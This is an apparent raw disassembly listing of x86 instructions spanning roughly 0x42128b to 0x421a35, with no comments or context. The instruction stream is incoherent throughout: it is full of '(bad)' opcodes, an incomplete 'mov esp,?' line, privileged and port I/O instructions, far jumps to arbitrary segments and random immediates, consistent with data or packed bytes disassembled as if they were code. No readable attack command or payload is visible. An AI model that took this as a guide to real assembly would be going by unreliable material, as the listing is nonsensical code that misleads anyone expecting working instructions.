  42128b:	add    ecx,DWORD PTR [edi+eiz*4-0x69361db1]
  421292:	clc    
  421293:	lea    esi,[ebp-0x79643be8]
  421299:	adc    BYTE PTR [ecx],bl
  42129b:	std    
  42129c:	sub    eax,0x6fb81824
  4212a1:	repz or BYTE PTR [edi],dl
  4212a4:	dec    ebx
  4212a5:	or     DWORD PTR [edi-0x2f],0x7a95d24c
  4212ac:	adc    ebx,DWORD PTR [esi-0x4ad1da8f]
  4212b2:	aad    0x49
  4212b4:	js     0x42130e
  4212b6:	push   edi
  4212b7:	dec    esp
  4212b8:	in     eax,0xb1
  4212ba:	mov    WORD PTR [ecx-0x74e7ec73],ss
  4212c0:	out    0xa2,al
  4212c2:	sahf   
  4212c3:	add    bh,BYTE PTR [ebp-0x14]
  4212c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212c7:	xor    bl,BYTE PTR [esi]
  4212c9:	add    cl,BYTE PTR [edi]
  4212cb:	rcl    ebp,0xf6
  4212ce:	xlat   BYTE PTR ds:[ebx]
  4212cf:	adc    dl,cl
  4212d1:	mov    ecx,edi
  4212d3:	xor    cl,BYTE PTR [edi+0x4f600bcf]
  4212d9:	dec    esp
  4212da:	(bad)  
  4212db:	in     al,0x34
  4212dd:	mov    bl,0x39
  4212df:	aam    0xed
  4212e1:	push   ecx
  4212e2:	mov    bh,0x56
  4212e4:	xor    DWORD PTR [edi+0xebabca2],0xffffff81
  4212eb:	lods   eax,DWORD PTR ds:[esi]
  4212ec:	sub    dh,BYTE PTR [edx]
  4212ee:	pop    edi
  4212ef:	adc    al,0xa2
  4212f1:	xchg   edx,eax
  4212f2:	inc    esp
  4212f3:	ja     0x421286
  4212f5:	jge    0x421341
  4212f7:	cmp    BYTE PTR [edi+edx*4-0x5d1febde],cl
  4212fe:	mov    ch,0x18
  421300:	push   ss
  421301:	test   eax,0xc36d61cd
  421306:	and    BYTE PTR [eax+0x76188a95],ah
  42130c:	jbe    0x421295
  42130e:	cmp    BYTE PTR [ebx-0x7dfdcf99],al
  421314:	mov    ecx,0xe0355021
  421319:	adc    DWORD PTR [eax+0x9],esp
  42131c:	pop    esi
  42131d:	int    0xce
  42131f:	mov    BYTE PTR [ecx],ch
  421321:	add    eax,DWORD PTR [edi+0x2dd75c08]
  421327:	repz scas al,BYTE PTR es:[edi]
  421329:	sahf   
  42132a:	pop    ds
  42132b:	enter  0x7293,0x31
  42132f:	sub    DWORD PTR [ecx+eiz*2],edx
  421332:	bound  esi,QWORD PTR [eax+0x4e]
  421335:	xor    ebx,DWORD PTR [esi-0x4ff2e889]
  42133b:	adc    al,0xf8
  42133d:	(bad)  
  42133e:	xor    DWORD PTR [ecx+0xf],ebp
  421341:	in     al,0xaa
  421343:	scas   eax,DWORD PTR es:[edi]
  421344:	cmc    
  421345:	fcom   QWORD PTR [ebx+eax*1+0x380ef9d9]
  42134c:	pushf  
  42134d:	retf   0xf39f
  421350:	push   ebp
  421351:	push   edi
  421352:	dec    ebx
  421353:	ins    BYTE PTR es:[edi],dx
  421354:	retf   0xa3f2
  421357:	sahf   
  421358:	xchg   esp,eax
  421359:	mov    al,0xa
  42135b:	mov    ch,0x4e
  42135d:	sahf   
  42135e:	dec    edi
  42135f:	(bad)  
  421360:	mov    ch,0x5
  421362:	imul   edi,esp,0x3dbc3385
  421368:	jg     0x42136b
  42136a:	push   esi
  42136b:	mov    esp,0x32cf07c4
  421370:	and    al,0xeb
  421372:	sub    BYTE PTR [eax-0x12],ch
  421375:	jae    0x4213ca
  421377:	mov    ecx,0x2251d32b
  42137c:	loopne 0x421329
  42137e:	imul   ecx,esi,0x97039cf0
  421384:	fwait
  421385:	out    dx,eax
  421386:	js     0x421405
  421388:	lahf   
  421389:	retf   
  42138a:	rcr    BYTE PTR [edx+0x48],1
  42138d:	mov    esp,0xac532570
  421392:	pop    edi
  421393:	neg    edx
  421395:	and    DWORD PTR [edi],0xb0e208e2
  42139b:	xchg   ecx,eax
  42139c:	sti    
  42139d:	pop    es
  42139e:	cmp    eax,0xe6692880
  4213a3:	out    dx,eax
  4213a4:	jno    0x421367
  4213a6:	pop    ds
  4213a7:	stc    
  4213a8:	mov    al,ds:0x7e1f03fa
  4213ad:	xor    eax,0xc98574a4
  4213b2:	or     DWORD PTR [edi],esi
  4213b4:	(bad)  
  4213b5:	in     al,dx
  4213b6:	push   ds
  4213b7:	add    al,0x97
  4213b9:	lods   al,BYTE PTR ds:[esi]
  4213ba:	fild   DWORD PTR [edi+0x471db022]
  4213c0:	push   cs
  4213c1:	push   0xffffff8b
  4213c3:	mov    eax,ds:0xe6131123
  4213c8:	sbb    eax,0xac555d86
  4213cd:	dec    esp
  4213ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213cf:	push   esp
  4213d0:	xor    eax,DWORD PTR [edx+0x6ac5ab70]
  4213d6:	or     ch,BYTE PTR [edi]
  4213d8:	aad    0xa1
  4213da:	dec    esp
  4213db:	xchg   esp,eax
  4213dc:	std    
  4213dd:	and    eax,0xb9522f32
  4213e2:	cmp    BYTE PTR [edx],ah
  4213e4:	int3   
  4213e5:	or     DWORD PTR [eax+0x53022949],esp
  4213eb:	mov    esi,0x380212b7
  4213f0:	cmp    edi,DWORD PTR [ebp-0x3c]
  4213f3:	(bad)  
  4213f4:	mov    edi,0xa8d795ae
  4213f9:	mov    ebx,0x46372e2e
  4213fe:	loopne 0x42144a
  421400:	or     dh,BYTE PTR [ebx+0x9]
  421403:	fisubr DWORD PTR [ecx]
  421405:	int3   
  421406:	mov    db0,edi
  421409:	jns    0x421438
  42140b:	dec    ecx
  42140c:	das    
  42140d:	mov    ah,0xd2
  42140f:	mov    al,ds:0x910e3296
  421414:	push   ds
  421415:	push   ebx
  421416:	push   edi
  421417:	js     0x421406
  421419:	pushf  
  42141a:	pop    es
  42141b:	cmp    bl,ch
  42141d:	mov    dl,BYTE PTR [ebp+0x2d]
  421420:	jae    0x4213da
  421422:	repz idiv DWORD PTR [edx]
  421425:	cmp    DWORD PTR [ebx],eax
  421427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421428:	repz into 
  42142a:	dec    esi
  42142b:	ret    0x12d
  42142e:	into   
  42142f:	addr16 mov ebx,0x9baec03f
  421435:	arpl   di,bx
  421437:	fist   DWORD PTR [ecx+0x26]
  42143a:	adc    al,0xb6
  42143c:	sbb    BYTE PTR [eax+0x1b98540d],ah
  421442:	mov    edi,0x1db78207
  421447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421448:	or     eax,0x2699aa65
  42144d:	fsubr  QWORD PTR [esi]
  42144f:	ret    0xf19
  421452:	popa   
  421453:	sar    DWORD PTR [ebx+0x1a453f8f],cl
  421459:	pop    ss
  42145a:	mov    dh,0x32
  42145c:	push   0x5e7caaef
  421461:	jne    0x421498
  421463:	mov    BYTE PTR [esi-0x28],al
  421466:	jg     0x42147e
  421468:	rcr    DWORD PTR ds:0xd51e2f8a,0x6f
  42146f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421470:	mov    cl,0x5
  421472:	jne    0x42148e
  421474:	mov    esi,0x7e987d85
  421479:	sysexit 
  42147b:	lods   eax,DWORD PTR ds:[esi]
  42147c:	icebp  
  42147d:	sub    al,BYTE PTR [edx+0x539359ce]
  421483:	push   edi
  421484:	(bad)  
  421485:	fisttp QWORD PTR [edi]
  421487:	inc    edx
  421488:	ja     0x42143e
  42148a:	push   cs
  42148b:	fwait
  42148c:	lods   al,BYTE PTR ds:[esi]
  42148d:	jmp    0x8015:0x644730a4
  421494:	enter  0x13bf,0x8
  421498:	mov    esp,0x8109d898
  42149d:	call   0xfc72:0xba9dc260
  4214a4:	jmp    0x4214c7
  4214a6:	les    esi,FWORD PTR fs:[esi]
  4214a9:	mov    eax,0x768430b7
  4214ae:	out    dx,al
  4214af:	das    
  4214b0:	mov    esi,0xc9a85966
  4214b5:	jmp    0x421531
  4214b7:	and    DWORD PTR [esi+0x59f40f3f],esi
  4214bd:	push   ss
  4214be:	cli    
  4214bf:	ficom  WORD PTR [edi+0xf96aee0]
  4214c5:	jp     0x421477
  4214c7:	push   ss
  4214c8:	sub    ebx,esp
  4214ca:	imul   esi,DWORD PTR [edi+0x76],0xffffffe3
  4214ce:	adc    BYTE PTR [ebx+0x41],ch
  4214d1:	rol    ebp,0xc1
  4214d4:	inc    ebx
  4214d5:	jo     0x421479
  4214d7:	std    
  4214d8:	js     0x4214d1
  4214da:	mov    eax,ds:0x639878d2
  4214df:	outs   dx,DWORD PTR ds:[esi]
  4214e0:	xchg   ebp,eax
  4214e1:	mov    bh,al
  4214e3:	add    al,0x8f
  4214e5:	jno    0x4214db
  4214e7:	cmp    al,0x86
  4214e9:	cmp    ah,bl
  4214eb:	bound  esi,QWORD PTR [edx]
  4214ed:	mov    al,0x5
  4214ef:	rcr    dl,0xd
  4214f2:	push   ebx
  4214f3:	xor    esi,DWORD PTR [ebx+0x77fe015d]
  4214f9:	ss scas eax,DWORD PTR es:[edi]
  4214fb:	test   DWORD PTR [ecx],0x6a2418bf
  421501:	pop    edx
  421502:	mov    al,0x5a
  421504:	mov    es,ecx
  421506:	or     al,0x37
  421508:	addr16 rol ecx,cl
  42150b:	mov    ch,0x7
  42150d:	mov    cs,ebp
  42150f:	mov    cl,0x3e
  421511:	jb     0x42150f
  421513:	scas   al,BYTE PTR es:[edi]
  421514:	mov    bl,0xd6
  421516:	leave  
  421517:	jo     0x4214c6
  421519:	sbb    dl,ah
  42151b:	aad    0xd9
  42151d:	stos   DWORD PTR es:[edi],eax
  42151e:	or     edi,0xffffff8a
  421521:	dec    edi
  421522:	out    dx,eax
  421523:	cld    
  421524:	sbb    al,0xed
  421526:	jb     0x42155f
  421528:	inc    ebx
  421529:	sahf   
  42152a:	push   edi
  42152b:	xchg   esi,eax
  42152c:	fadd   QWORD PTR [ecx+0x21b03188]
  421532:	pop    esp
  421533:	inc    ebp
  421534:	jle    0x42159a
  421536:	xchg   esp,eax
  421537:	pushf  
  421538:	out    0xbf,al
  42153a:	loope  0x421583
  42153c:	jns    0x42156e
  42153e:	mov    ds:0xddb88fe0,eax
  421543:	je     0x4214c6
  421545:	pop    es
  421546:	xchg   ebx,eax
  421547:	aaa    
  421548:	aad    0x24
  42154a:	cmp    BYTE PTR [eax],cl
  42154c:	(bad)  
  42154d:	cld    
  42154e:	pop    ds
  42154f:	or     dh,BYTE PTR [edx]
  421551:	mov    eax,ds:0x7ac62bb1
  421556:	jg     0x4214dd
  421558:	retf   0xd186
  42155b:	cs in  eax,0x8
  42155e:	(bad)  
  42155f:	inc    DWORD PTR [eax+0x20]
  421562:	xlat   BYTE PTR ds:[ebx]
  421563:	cmp    DWORD PTR [ebx],ecx
  421565:	fwait
  421566:	mov    eax,ds:0x3d105950
  42156b:	pop    ebp
  42156c:	in     eax,0xc6
  42156e:	ds or  ebx,edx
  421571:	fdivr  DWORD PTR [esi-0x45]
  421574:	jle    0x4215cd
  421576:	jge    0x4215cb
  421578:	mov    bl,0xc8
  42157a:	jns    0x4215ed
  42157c:	xor    BYTE PTR [ecx],0xd6
  42157f:	stos   DWORD PTR es:[edi],eax
  421580:	push   esi
  421581:	ja     0x421578
  421583:	pop    eax
  421584:	(bad)  
  421585:	retf   
  421586:	pop    edx
  421587:	xlat   BYTE PTR ds:[ebx]
  421588:	jae    0x421587
  42158a:	in     al,dx
  42158b:	and    eax,0xe7b262fd
  421590:	scas   eax,DWORD PTR es:[edi]
  421591:	jge    0x42157c
  421593:	adc    al,0xe5
  421595:	retf   0x586c
  421598:	mov    bl,BYTE PTR [esi+edi*2-0x487c9d87]
  42159f:	cwde   
  4215a0:	ret    0xb411
  4215a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215a4:	out    dx,al
  4215a5:	and    DWORD PTR [ebp+0x7e],eax
  4215a8:	sahf   
  4215a9:	test   bh,bh
  4215ab:	adc    BYTE PTR [ecx+0x77],0xc
  4215af:	mov    esp,?
  4215b1:	pop    es
  4215b2:	adc    al,0x23
  4215b4:	mov    WORD PTR [edx],ds
  4215b6:	stos   DWORD PTR es:[edi],eax
  4215b7:	dec    esp
  4215b8:	push   cs
  4215b9:	lea    esi,[eax-0x3619b375]
  4215bf:	loop   0x4215cc
  4215c1:	and    eax,0x2b14f50e
  4215c6:	bound  esp,QWORD PTR [ebp-0x660576e]
  4215cc:	push   0xec629735
  4215d1:	fst    DWORD PTR [edx-0x1a]
  4215d4:	sbb    al,0x30
  4215d6:	test   DWORD PTR [esi-0x2fcc9786],eax
  4215dc:	inc    ecx
  4215dd:	xchg   ebp,eax
  4215de:	mov    ecx,0x4068db78
  4215e3:	out    0x6e,al
  4215e5:	cmp    BYTE PTR [eax-0x12],bl
  4215e8:	or     al,0xb3
  4215ea:	adc    BYTE PTR [ecx],dl
  4215ec:	cmp    eax,0xb01fdee5
  4215f1:	mov    edi,0xdee5178d
  4215f6:	repnz mov WORD PTR [edx+0xd],gs
  4215fa:	clc    
  4215fb:	dec    ecx
  4215fc:	ins    BYTE PTR es:[edi],dx
  4215fd:	or     ebx,ebx
  4215ff:	fwait
  421600:	iret   
  421601:	mov    esi,0x5f21d4b3
  421606:	fst    DWORD PTR [eax-0x69]
  421609:	jmp    0x421612
  42160b:	or     BYTE PTR [eax],ah
  42160d:	(bad)  
  42160e:	into   
  42160f:	pop    eax
  421610:	and    DWORD PTR [edi-0x53],eax
  421613:	jge    0x421616
  421615:	jne    0x421623
  421617:	cmp    eax,0x276202d2
  42161c:	mov    eax,ds:0xd124c190
  421621:	push   ds
  421622:	pop    ebp
  421623:	out    0xd8,al
  421625:	sub    ecx,0xeb2194e4
  42162b:	bound  esi,QWORD PTR [ebx+0x7e]
  42162e:	ins    DWORD PTR es:[edi],dx
  42162f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421630:	fisttp WORD PTR [edi-0x1b4a4310]
  421636:	lods   al,BYTE PTR ds:[esi]
  421637:	pop    eax
  421638:	jl     0x42161a
  42163a:	ret    
  42163b:	sub    dl,ch
  42163d:	xchg   BYTE PTR [edi],dl
  42163f:	nop
  421640:	jne    0x42163d
  421642:	in     al,0xe6
  421644:	jp     0x42160f
  421646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421647:	inc    esp
  421648:	mov    ecx,0xf1aa0526
  42164d:	mov    edx,0x9ab0c0f8
  421652:	fdivr  DWORD PTR [edx]
  421654:	add    eax,0x94d12537
  421659:	call   0x7f7ca9c5
  42165e:	stos   BYTE PTR es:[edi],al
  42165f:	outs   dx,DWORD PTR ds:[esi]
  421660:	stos   BYTE PTR es:[edi],al
  421661:	jmp    0x12b87627
  421666:	dec    ebx
  421667:	(bad)  
  421668:	pop    ecx
  421669:	xchg   DWORD PTR [eax+edi*8+0x3612b503],eax
  421670:	loope  0x421645
  421672:	(bad)  
  421673:	inc    DWORD PTR [eax]
  421675:	mov    eax,ds:0x62d75039
  42167a:	test   DWORD PTR [eax],ebx
  42167c:	pushf  
  42167d:	xor    esp,DWORD PTR [esp+eiz*8+0x54]
  421681:	push   ds
  421682:	pop    ebp
  421683:	mov    ch,bl
  421685:	add    al,0x40
  421687:	add    BYTE PTR [ecx+0x9],0xb0
  42168b:	and    al,ch
  42168d:	pop    es
  42168e:	in     eax,0x65
  421690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421691:	popa   
  421692:	inc    ecx
  421693:	iret   
  421694:	mov    ebp,0xebd8769a
  421699:	pop    ecx
  42169a:	mov    dl,BYTE PTR [edx-0x4ec491e6]
  4216a0:	jne    0x421704
  4216a2:	dec    ecx
  4216a3:	fwait
  4216a4:	mov    esp,DWORD PTR [ecx-0x27]
  4216a7:	inc    esp
  4216a8:	pop    eax
  4216a9:	cmp    eax,0x42e5b61d
  4216ae:	mov    dl,0xdf
  4216b0:	sti    
  4216b1:	ror    DWORD PTR [ebx+edx*8-0x1ca9e404],cl
  4216b8:	pop    ds
  4216b9:	xor    bl,0x6e
  4216bc:	fsubr  QWORD PTR [ecx+ecx*8+0x386c6b0d]
  4216c3:	cli    
  4216c4:	das    
  4216c5:	add    al,0xe5
  4216c7:	ins    BYTE PTR es:[edi],dx
  4216c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216c9:	jbe    0x4216e4
  4216cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216cc:	cmp    BYTE PTR gs:[edi+0x5f],0x5b
  4216d1:	mov    eax,0x33b3f522
  4216d6:	push   0x14
  4216d8:	mov    al,0xe2
  4216da:	aam    0xc4
  4216dc:	jno    0x4216ab
  4216de:	dec    esp
  4216df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216e0:	xchg   ebx,eax
  4216e1:	pop    edi
  4216e2:	jb     0x4216b7
  4216e4:	mov    eax,gs
  4216e6:	fmul   QWORD PTR [edx+0x70]
  4216e9:	mov    al,ds:0x1accb621
  4216ee:	add    BYTE PTR [esi+0x3b4122d0],dh
  4216f4:	jbe    0x421727
  4216f6:	xchg   esp,eax
  4216f7:	sti    
  4216f8:	adc    al,0x2d
  4216fa:	pop    ebp
  4216fb:	mov    dl,0xc9
  4216fd:	aam    0x29
  4216ff:	jecxz  0x4216de
  421701:	push   DWORD PTR [ebx-0xbacf37]
  421707:	or     edx,DWORD PTR [edi+0x25]
  42170a:	cdq    
  42170b:	push   0xe1f301a9
  421710:	sub    al,0xb4
  421712:	or     ecx,DWORD PTR [esi-0x507e6e40]
  421718:	hlt    
  421719:	cmc    
  42171a:	push   cs
  42171b:	data16 jl 0x421730
  42171e:	mov    bl,0xbf
  421720:	cmp    eax,0x1c0801a4
  421725:	stos   BYTE PTR es:[edi],al
  421726:	jle    0x42177c
  421728:	or     ecx,DWORD PTR [esi+eiz*2+0x4d]
  42172c:	and    al,0x3a
  42172e:	dec    ebp
  42172f:	sbb    ch,bl
  421731:	xor    DWORD PTR [esi+0x0],esp
  421734:	jmp    0x6c1bd5c
  421739:	cmp    DWORD PTR [ecx],eax
  42173b:	jge    0x421757
  42173d:	mov    bl,0x25
  42173f:	fbstp  TBYTE PTR [ebx]
  421741:	cdq    
  421742:	leave  
  421743:	enter  0x6d0c,0x44
  421747:	cs ins BYTE PTR es:[edi],dx
  421749:	xchg   ecx,eax
  42174a:	loopne 0x4217bf
  42174c:	mov    edx,0x97f94d3f
  421751:	sub    BYTE PTR [ebx-0x45],dh
  421754:	neg    BYTE PTR [edx]
  421756:	mov    al,ds:0x65c02327
  42175b:	add    al,0x3d
  42175d:	adc    ebp,ebp
  42175f:	mov    dh,0xdd
  421761:	add    DWORD PTR [esi],eax
  421763:	jae    0x4217bd
  421765:	xor    DWORD PTR [ecx+0x2769a162],ebx
  42176b:	retf   
  42176c:	xchg   ecx,eax
  42176d:	push   ds
  42176e:	dec    edx
  42176f:	push   0x5e
  421771:	inc    ebx
  421772:	or     DWORD PTR [esi-0x6b],eax
  421775:	push   es
  421776:	add    ah,BYTE PTR [edi-0x8]
  421779:	test   al,0x7b
  42177b:	xor    ecx,DWORD PTR [ecx+ebp*2+0x55]
  42177f:	fcom   st(3)
  421781:	in     al,dx
  421782:	or     BYTE PTR [edi+0x6a],bl
  421785:	add    al,0x51
  421787:	jp     0x4217c0
  421789:	mov    al,0xc6
  42178b:	pmuludq mm7,mm6
  42178e:	push   cs
  42178f:	xor    eax,0xe6bdc203
  421794:	inc    ebx
  421795:	mov    BYTE PTR [eax+0x3f],dl
  421798:	and    ebp,esp
  42179a:	add    DWORD PTR [edx+0x65],eax
  42179d:	fldcw  WORD PTR [eax+0x77]
  4217a0:	dec    esi
  4217a1:	sub    ch,dl
  4217a3:	or     esp,ebx
  4217a5:	mov    esi,0x4fd1e1ac
  4217aa:	in     eax,0x64
  4217ac:	xchg   ebx,eax
  4217ad:	dec    eax
  4217ae:	jecxz  0x421751
  4217b0:	mov    esi,0x2322da59
  4217b5:	mov    BYTE PTR [edx-0x7a86f6de],0x20
  4217bc:	ror    esi,cl
  4217be:	fld    QWORD PTR [edx]
  4217c0:	adc    dh,bl
  4217c2:	or     dl,BYTE PTR [ebx]
  4217c4:	mov    bh,0x52
  4217c6:	xor    al,0x2c
  4217c8:	or     ebx,DWORD PTR [edi]
  4217ca:	(bad)  
  4217cb:	cmp    cl,ch
  4217cd:	or     DWORD PTR [esi+0x5804431a],eax
  4217d3:	jbe    0x421758
  4217d5:	xchg   edx,eax
  4217d6:	push   esi
  4217d7:	xchg   DWORD PTR gs:[ebp-0x5f952f2d],ebp
  4217de:	shl    DWORD PTR [edi+0x5c5a40ac],cl
  4217e4:	loop   0x421787
  4217e6:	cld    
  4217e7:	pushf  
  4217e8:	das    
  4217e9:	and    BYTE PTR [eax+ebx*4],ah
  4217ec:	ins    BYTE PTR es:[edi],dx
  4217ed:	mov    eax,ds:0x4060ab3a
  4217f2:	out    dx,al
  4217f3:	dec    edi
  4217f4:	mov    edi,0xc8b22d15
  4217f9:	push   ss
  4217fa:	test   BYTE PTR [edi],0x85
  4217fd:	bswap  ebx
  4217ff:	inc    esi
  421800:	sbb    al,0x8
  421802:	push   ds
  421803:	xchg   esi,eax
  421804:	int    0x7
  421806:	call   0xbca7160c
  42180b:	and    eax,ebp
  42180d:	pop    ebx
  42180e:	inc    ecx
  42180f:	and    al,0xf7
  421811:	adc    al,BYTE PTR [ecx-0x6f]
  421814:	pop    esp
  421815:	adc    ah,BYTE PTR [ecx-0x2eda00cf]
  42181b:	xchg   esi,eax
  42181c:	int3   
  42181d:	dec    ecx
  42181e:	mov    bh,0xc
  421820:	inc    ebp
  421821:	jo     0x4217a3
  421823:	ss jae 0x4217ff
  421826:	sbb    ecx,DWORD PTR [ebx-0xe]
  421829:	retf   
  42182a:	out    0xc7,al
  42182c:	jp     0x421820
  42182e:	sahf   
  42182f:	cs rcl eax,cl
  421832:	fild   DWORD PTR [ecx+0x3c]
  421835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421836:	mov    ah,0xd9
  421838:	mov    al,ds:0xdcc4abe
  42183d:	push   ecx
  42183e:	mov    eax,0xc1d7f145
  421843:	sub    bl,BYTE PTR [esi-0x33]
  421846:	and    BYTE PTR [edx+0x23],dh
  421849:	icebp  
  42184a:	dec    esi
  42184b:	fld    TBYTE PTR [ebx-0x11]
  42184e:	cmp    ah,dh
  421850:	dec    ebp
  421851:	inc    ecx
  421852:	jns    0x42181a
  421854:	ins    DWORD PTR es:[edi],dx
  421855:	nop
  421856:	aaa    
  421857:	fisubr WORD PTR [edi+0x53e31348]
  42185d:	and    esp,DWORD PTR [esi-0x49]
  421860:	stos   BYTE PTR es:[edi],al
  421861:	fistp  DWORD PTR [esi-0x6a]
  421864:	xchg   ecx,eax
  421865:	or     BYTE PTR [edi+0x2dd082c],bh
  42186b:	(bad)  
  42186c:	icebp  
  42186d:	mov    dh,0xd4
  42186f:	mov    eax,ds:0x45e77984
  421874:	iret   
  421875:	aas    
  421876:	enter  0xa53b,0x1b
  42187a:	or     al,0xd8
  42187c:	test   al,0x92
  42187e:	jae    0x4218e0
  421880:	sbb    edi,ebp
  421882:	mov    bh,0x79
  421884:	cmp    eax,0xe0a22e17
  421889:	call   0xd63e:0xc56d10b1
  421890:	jmp    0x46c5:0xd74ea544
  421897:	sub    BYTE PTR [esp+eiz*8],ah
  42189a:	mov    edx,0xbd68ee4f
  42189f:	sub    DWORD PTR [edi],ebx
  4218a1:	fadd   st,st(0)
  4218a3:	lods   eax,DWORD PTR ds:[esi]
  4218a4:	mov    esi,0x9c47d9fb
  4218a9:	cs push ds
  4218ab:	ret    
  4218ac:	imul   esp,DWORD PTR [ebx+0x72],0x2a480e9c
  4218b3:	sbb    BYTE PTR [eax-0x7f],ah
  4218b6:	pop    esp
  4218b7:	rol    ah,cl
  4218b9:	add    bh,BYTE PTR [ecx]
  4218bb:	ds dec edx
  4218bd:	mov    esp,0x6ad017d
  4218c2:	jp     0x4218ac
  4218c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218c5:	(bad)  [edx+0x7ee8e48f]
  4218cb:	xor    ecx,eax
  4218cd:	push   ss
  4218ce:	mov    esi,0x2334047d
  4218d3:	push   ss
  4218d4:	(bad)  
  4218d5:	(bad)  
  4218d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218d7:	mov    ch,0x54
  4218d9:	pop    edx
  4218da:	ret    
  4218db:	sahf   
  4218dc:	mov    ebp,DWORD PTR [edi-0x79678f5a]
  4218e2:	stos   DWORD PTR es:[edi],eax
  4218e3:	ins    DWORD PTR es:[edi],dx
  4218e4:	xor    BYTE PTR [ebp-0x6ce081f1],dh
  4218ea:	adc    DWORD PTR [ebx+0x3e22fc92],ecx
  4218f0:	jno    0x421896
  4218f2:	mov    al,0x15
  4218f4:	pop    edi
  4218f5:	fnstenv [esi]
  4218f7:	and    dl,BYTE PTR [edx+edx*4-0x4b2d09ff]
  4218fe:	repz fisub DWORD PTR [edi-0x54]
  421902:	inc    edx
  421903:	sar    ah,cl
  421905:	and    eax,0x38c7487c
  42190a:	cld    
  42190b:	retf   
  42190c:	retf   
  42190d:	cmp    ah,bh
  42190f:	jmp    DWORD PTR [ecx+0x515c0467]
  421915:	aas    
  421916:	ins    BYTE PTR es:[edi],dx
  421917:	out    0x2c,eax
  421919:	test   al,0x16
  42191b:	xor    BYTE PTR [edi+ebp*1-0x2e],dh
  42191f:	push   cs
  421920:	push   ebp
  421921:	(bad)  
  421922:	dec    edi
  421923:	jmp    0x4218b5
  421925:	mov    ebp,0x31d99c21
  42192a:	stos   DWORD PTR es:[edi],eax
  42192b:	fcom   DWORD PTR [ebp+0x6a]
  42192e:	jno    0x421958
  421930:	xor    dh,0xa2
  421933:	ins    DWORD PTR es:[edi],dx
  421934:	jmp    0xbe6:0xde85f7c8
  42193b:	pop    edx
  42193c:	xchg   ebx,eax
  42193d:	clc    
  42193e:	(bad)  
  42193f:	mov    esp,0xdf107697
  421944:	cmp    al,0x1e
  421946:	(bad)  
  421947:	out    dx,al
  421948:	std    
  421949:	push   0x5651c335
  42194e:	or     eax,0xe749fc23
  421953:	hlt    
  421954:	bound  esi,QWORD PTR [esp+esi*8-0xef3204e]
  42195b:	ins    BYTE PTR es:[edi],dx
  42195c:	daa    
  42195d:	ret    0xa841
  421960:	repz ret 0x4d8f
  421964:	(bad)  
  421965:	out    0x39,al
  421967:	lahf   
  421968:	mov    edx,DWORD PTR [eax]
  42196a:	xor    al,0x1c
  42196d:	xchg   ecx,eax
  42196e:	dec    edx
  42196f:	retf   0xd040
  421972:	inc    eax
  421973:	dec    esp
  421974:	push   ebx
  421975:	bound  eax,QWORD PTR [eax+0x32]
  421978:	popf   
  421979:	das    
  42197a:	adc    BYTE PTR [ebp-0x29671b52],0x34
  421981:	mov    WORD PTR [esi-0x7a],es
  421984:	and    ah,dh
  421986:	pop    esp
  421987:	hlt    
  421988:	or     ecx,DWORD PTR [edi]
  42198a:	jb     0x4219ef
  42198c:	dec    edx
  42198d:	icebp  
  42198e:	les    ebx,FWORD PTR ss:[ebx+0x2ea83585]
  421995:	jnp    0x4219d1
  421997:	mov    ebp,0xf02dcdde
  42199c:	mov    bl,ah
  42199e:	jmp    0x1d3e:0xd751db13
  4219a5:	fwait
  4219a6:	or     BYTE PTR [edi],bl
  4219a8:	add    al,bl
  4219aa:	repnz daa 
  4219ac:	and    al,0xb7
  4219ae:	addr16 inc edx
  4219b0:	mov    BYTE PTR [ecx],bl
  4219b2:	jns    0x4219ca
  4219b4:	sub    esp,DWORD PTR [ecx+0x79]
  4219b7:	mov    al,0x79
  4219b9:	xlat   BYTE PTR ds:[ebx]
  4219ba:	in     al,0x57
  4219bc:	adc    DWORD PTR [ecx],ebp
  4219be:	aad    0xf8
  4219c0:	add    al,0x5c
  4219c2:	aaa    
  4219c3:	sub    dh,BYTE PTR [ebp-0x3b91a5d9]
  4219c9:	push   ecx
  4219ca:	rcr    ch,0xd3
  4219cd:	mov    ds:0xccbe7157,al
  4219d2:	cmp    DWORD PTR [ebx+eax*1],esp
  4219d5:	push   ebx
  4219d6:	popa   
  4219d7:	add    BYTE PTR [eax-0x2a],dl
  4219da:	add    esp,DWORD PTR [ecx]
  4219dc:	mov    esi,0x1dc0f776
  4219e1:	mov    ch,0xbf
  4219e3:	idiv   BYTE PTR [esi]
  4219e5:	dec    esp
  4219e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219e7:	push   es
  4219e8:	shl    DWORD PTR [edx-0x6],1
  4219eb:	mov    ebx,0x4afbf4d5
  4219f0:	lods   eax,DWORD PTR ds:[esi]
  4219f1:	jno    0x421a14
  4219f3:	repz in al,0xdf
  4219f6:	sbb    ecx,DWORD PTR [edx-0x9]
  4219f9:	xor    BYTE PTR [edx+edx*4-0x5a0de862],dl
  421a00:	std    
  421a01:	pusha  
  421a02:	gs ret 0x34d0
  421a06:	js     0x421a86
  421a08:	xchg   ebx,eax
  421a09:	xchg   esi,eax
  421a0a:	xor    dh,BYTE PTR [ebx]
  421a0c:	and    ebx,eax
  421a0e:	adc    eax,0xa6f71111
  421a13:	push   sp
  421a16:	inc    ecx
  421a17:	sub    al,dh
  421a19:	push   ecx
  421a1a:	xor    al,0xdb
  421a1c:	icebp  
  421a1d:	call   0xdf2f559e
  421a22:	push   cs
  421a23:	mov    al,0xfa
  421a25:	and    edi,edi
  421a27:	mov    cl,0xeb
  421a29:	sub    BYTE PTR [ebx+0x61],al
  421a2c:	push   edi
  421a2d:	jmp    0x421aab
  421a2f:	and    dh,BYTE PTR [edi-0x61]
  421a32:	cmp    ch,0xff
  421a35:	xor    DWORD PTR [ecx],eax
